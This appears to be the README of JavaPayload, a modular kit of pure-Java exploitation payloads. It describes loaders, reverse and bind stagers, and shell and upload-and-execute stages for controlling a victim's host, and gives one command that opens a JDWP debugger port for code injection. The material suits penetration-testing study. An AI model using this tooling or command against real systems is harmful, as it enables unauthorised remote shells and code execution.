<h2>Introduction</h2>

<p>There are very good frameworks available (like Metasploit) to exploit vulnerabilities in native applications.
They also support exploiting Java applications, but usually only provide platform-dependent native payloads (with focus
on Microsoft Windows platforms). When exploiting a vulnerability in a Java service or a vulnerability in the
Java browser plugin, it is not always clear which operating system you are targeting. In this case, pure Java
payloads can increase the chance of successful exploitation if the platform was guessed wrong.</p>

<p>This archive contains a collection of pure Java payloads, from simple Shell and UpExec payloads (which need - to some
degree - platform dependent parameters), to a <tt>JSh</tt> ("Java Shell") payload that supports an interactive shell to
query system properties, run applications, open TCP connections, navigate the filesystem and read/write text files.
Basic job control enables to run more than one command or TCP session via a single exploited session.</p>

<p>These payloads are modular, consisting of three parts: loaders, stagers and stages. For more details refer to the
sections below. Loaders, stagers and stages can be combined arbitrarily, and the stages and stagers can also be
used to integrate them into other exploit frameworks like Metasploit (if you are more Ruby-literate than me).</p>

<h3>Loaders</h3>

<p>Loaders are similar to exploits in Metasploit. They are responsible for loading the stager and executing it. As
the loaders included in this package do not really exploit vulnerabilities, I have named them loaders and not
exploits. Included loaders are standalone Java program loader (to load the payload via a remote upload/command
execution vulnerability), an Applet loader (to load the payload as a signed applet), am  "Agent" loader (to 
load the payload from an Agent Jar from disk into another Java process) and a JDWP 
loader (to load the payload into a process via the Java Debugger Wire Protocol without touching the disk on
the target machine - either an existing Java process that has a debugger port open or a new one loaded by remote
command execution of "<tt>java -Xrunjdwp:transport=dt_socket,suspend=y,server=y,address=9821</tt>").</p>

<p>The standalone loader can be started either from the original Jar file, from a custom-tailored Jar file that
includes only the needed classes, or from a custom-tailored Class file which is created on demand by the 
ObjectWeb ASM toolkit. Parameters for stagers and stages can be either embedded into the tailored jar/class file
or provided on the command line. Applets are always built as jar files and load their parameters from the
<tt>&lt;param&gt;</tt> tags from the HTML. Agent jars receive their parameters via the command line. The JDWP 
loader will create a new byte array in the target JVM, fill it with the class file, load it and invoke it.</p>

<h3>Stagers</h3>

<p>Stagers are responsible for obtaining a TCP connection (or any other connection providing both an InputStream 
and an OutputStream) to the attacker and loading the stages dynamically. A stager is a single class file
that extends the <tt>javapayload.stager.Stager</tt> class and does not depend on any other classes. It may implement
additional interfaces which are part of the Java API, but no custom interfaces. And it may not have any 
explicit constructors or inner classes.
(If the stager does not follow these principles, it will not work in combination with loaders that build
custom-tailored Jar or Class files). The stager will then obtain a list of classes (as byte arrays, prefixed with
a 32-bit length field; the last one is followed by a length field of zero), load them, and instantiate the last one
of them (which is expected to implement the <tt>javapayload.stage.Stage</tt> interface).</p>

<p>Included stagers are BindTCP, ReverseTCP, ReverseSLL (without certificate checking), and a LocalTest stager
that runs the stager in the same Java process which is used for the handler (useful for debugging more complex
stages). All these stagers (except the LocalTest one) will need a hostname and a port number as parameters.</p>

<h3>Stages</h3>

<p>Stages are loaded by a stager and responsible for doing what you want to do on the victim's host (like provide a
shell or execute an uploaded file). The included stages are Exec (execute a command with parameters), 
UpExec (upload a file and execute it with parameters), Shell (execute a shell based on operating system, 
cmd.exe for Windows and /bin/sh for everything else) and JSh (try it yourself, it is awesome). All these
stages will forward stdin, stdout and stderr streams automatically. Shell and JSh do not need parameters, the other
two expect a command name and optional arguments - for UpExec the command name should be an absolute file name
on the attacker's machine, which will be uploaded to the temp directory and executed there.</p>

<h2>System requirements</h2>

<p><b>On the "attacker" machine:</b> Java Runtime Environment or Java Development Kit 1.4 or newer
(JDK 6.0 recommended)</p>

<p><b>On the "victim" machine:</b> Java Runtime Environment 1.2 or newer (1.4 for SSL stagers)</p>

<h2>Quickstart</h2>

<p>When calling a loader, you can pass it parameters. The first parameter will always be the name of the stager
(case sensitive as it is sometimes used to load the class), followed by the stager parameters (usually
host and port). After them, there is a parameter consisting of only two dashes ("<tt>--</tt>") which is used to
separate stage arguments from stager arguments. After the dashes is the name of the stage (which is case sensitive
as well) and the stage parameters (command line). All the parameters are forwarded to the stage (to keep the stagers
small), so if you want to write your own stages, you'll have to find the double-dash yourself.</p>

<p>On the attacker's side there is a <i>handler</i> which is used to upload the correct classes to the stager
and forward streams. The included command-line handler is called <tt>javapayload.handler.stager.StagerHandler</tt> and
expects the same parameters that were passed to the loader. (The loader and the stager will know themselves
that they do not need a host name when they listen, but it should be in the command line nevertheless to make
command lines more uniform).</p>

<p>In the following examples I assume that you have <tt>JavaPayload.jar</tt> in your classpath; for some examples,
the ASM libraries and/or the JDK's <tt>tools.jar</tt> have to be in the classpath as well.</p>

<p>The examples use the <tt>ReverseSSL</tt> stager and the <tt>JSH</tt> stage; all the other stagers/stages can be used as well.</p>
